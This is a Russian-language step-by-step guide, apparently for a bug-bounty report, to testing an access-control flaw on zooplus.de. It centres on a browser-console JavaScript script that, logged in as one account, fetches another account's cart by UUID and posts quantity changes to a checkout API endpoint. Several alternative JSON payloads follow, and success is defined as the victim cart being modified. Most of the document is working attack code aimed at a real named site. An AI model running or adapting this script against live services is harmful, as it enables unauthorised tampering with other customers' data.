# Тестирование реального endpoint найденного в Network tab

## Найденный endpoint:

```
POST /semiprotected/api/checkout/state-api/v2/set-article-quantity
```

## Инструкция:

### Шаг 1: Найдите точный payload в Network tab

1. Откройте DevTools → Network tab
2. Найдите запрос `set-article-quantity`
3. Кликните на него → вкладка "Payload" или "Request"
4. Скопируйте **точный JSON payload**

### Шаг 2: Выполните тест в консоли браузера (Account B залогинен)

```javascript
const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

// Получить текущее состояние корзины Account A
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  window.beforeCount = cart.articles.length;
  window.beforeTotal = cart.summary.grandTotal;
  const articleId = cart.articles[0]?.id;
  console.log(`Before: ${window.beforeCount} items, ${window.beforeTotal} EUR`);
  console.log(`Article ID: ${articleId}`);
  
  // ИСПОЛЬЗУЙТЕ ТОЧНЫЙ PAYLOAD ИЗ NETWORK TAB!
  return fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      // ВСТАВЬТЕ СЮДА ТОЧНЫЙ PAYLOAD ИЗ NETWORK TAB
      // Например:
      // articleId: articleId,
      // quantity: 2,
      // cartUuid: CART_UUID
    })
  });
})
.then(r => {
  console.log(`Status: ${r.status}`);
  return r.text().then(text => console.log(`Response: ${text.substring(0, 500)}`));
})
.then(() => {
  // Проверить результат
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  });
})
.then(r => r.json())
.then(cart => {
  console.log(`After: ${cart.articles.length} items, ${cart.summary.grandTotal} EUR`);
  if (cart.articles.length !== window.beforeCount || Math.abs(cart.summary.grandTotal - window.beforeTotal) > 0.01) {
    console.log("\n[!!!] SUCCESS! Cart modified!");
  }
});
```

## Альтернативные варианты payload:

Попробуйте разные форматы:

### Вариант 1:
```json
{
  "articleId": 2966422,
  "quantity": 2,
  "cartUuid": "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
}
```

### Вариант 2:
```json
{
  "articleId": 2966422,
  "quantity": 2,
  "sid": "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
}
```

### Вариант 3:
```json
{
  "id": 2966422,
  "qty": 2,
  "cartId": "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
}
```

## Если endpoint работает:

1. Скриншот Network tab с запросом
2. Скриншот консоли с успешным результатом
3. Скриншот корзины Account A после модификации
4. Обновлю отчет до **Critical (CVSS 9.1+)**

